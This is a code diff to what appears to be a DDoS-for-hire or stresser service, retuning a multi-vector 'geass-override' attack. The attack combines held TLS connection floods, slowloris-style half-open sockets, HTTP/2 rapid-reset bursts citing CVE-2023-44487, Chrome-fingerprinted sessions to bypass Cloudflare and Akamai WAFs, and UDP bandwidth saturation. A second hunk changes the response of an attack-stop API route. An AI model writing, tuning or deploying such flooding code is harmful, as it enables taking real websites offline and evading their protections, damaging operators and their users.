@@ -181,23 +181,28 @@ async function runAttackWorkers(
   // its guaranteed minimum regardless, scaling up with user threads above that.
   // With CPU_COUNT=6 and threads=60, total concurrent ops ≈ 100K+
   if (method === "geass-override") {
-    // Worker distribution: 1 worker per L4 method (conn/slow are FD-dense, not CPU-dense)
-    // 2-3 workers for H2/WAF (CPU-intensive stream multiplexing)
-    // Total: 1+1+2+2+1 = 7 workers max — safe within container memory limits
-    const connW = 1;                                         // 1 worker, many sockets
-    const slowW = 1;                                         // 1 worker, many sockets
-    const h2W   = Math.max(2, Math.ceil(CPU_COUNT * 0.30)); // 2-3 workers → HTTP/2 RST
-    const wafW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // 2 workers → WAF bypass
+    // Worker distribution: 1 worker per vector — total 5 workers = safe memory budget
+    // MEMORY BUDGET: container ~1GB total
+    //  • 5 workers × 75MB V8 heap = 375MB
+    //  • 750 conn + 800 slow = 1,550 TLS sockets × 80KB = 124MB
+    //  • H2 sessions (80) + WAF sessions (80) = 160 × 30KB = 5MB
+    //  • OS/other = ~200MB
+    //  TOTAL ≈ 704MB — safe within container limits
+    const connW = 1;  // FD-dense, 1 worker with 750 TLS sockets
+    const slowW = 1;  // FD-dense, 1 worker with 800 TLS sockets
+    const h2W   = 1;  // CPU-dense: 80 H2 sessions, 64-stream RST burst — dominant
+    const wafW  = 1;  // CPU-dense: 80 fingerprinted sessions — CF/Akamai bypass
+    // 1 udp worker always
 
-    // conn: 50  = 50×30=1,500 sockets (quick to establish, hold for 2 mins)
-    // slow: 40  = 40×40=1,600 half-open sockets (trickle every 10-25s)
-    // h2:  100  = min(200,80)=80 sessions × 64-burst RST = millions RST/s per worker
-    // waf:  80  = min(160,80)=80 Chrome-fingerprinted sessions → bypasses CF WAF
-    // udp:   8  = saturates bandwidth
+    // conn: max(50, t*0.20)t → MAX_CONN=min(t*15,750) held TLS sockets
+    // slow: max(40, t*0.15)t → MAX_CONN=min(t*20,800) half-open TLS sockets
+    // h2:   max(100, t*0.40)t → 80 sessions × 64-stream RST = CVE-2023-44487 dominance
+    // waf:  max(80, t*0.30)t  → 80 Chrome-fingerprinted sessions → origin bypass
+    // udp:  max(8, t*0.05)t   → bandwidth saturation
     const connT = Math.max(50,  Math.round(threads * 0.20));
     const slowT = Math.max(40,  Math.round(threads * 0.15));
-    const h2T   = Math.max(100, Math.round(threads * 0.35)); // dominant CVE vector
-    const wafT  = Math.max(80,  Math.round(threads * 0.25)); // dominant CF bypass
+    const h2T   = Math.max(100, Math.round(threads * 0.40)); // dominant CVE vector (now gets more)
+    const wafT  = Math.max(80,  Math.round(threads * 0.30)); // dominant CF bypass (now gets more)
     const udpT  = Math.max(8,   Math.round(threads * 0.05));
 
     // Track conns from conn+slow pools, sum and forward
@@ -328,7 +333,7 @@ router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
     .where(eq(attacksTable.id, p.data.id)).returning();
   if (!a) { res.status(404).json({ error: "Not found" }); return; }
   if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
-  res.json(a);
+  res.json({ ok: true, ...a });
 });
 
 export default router;
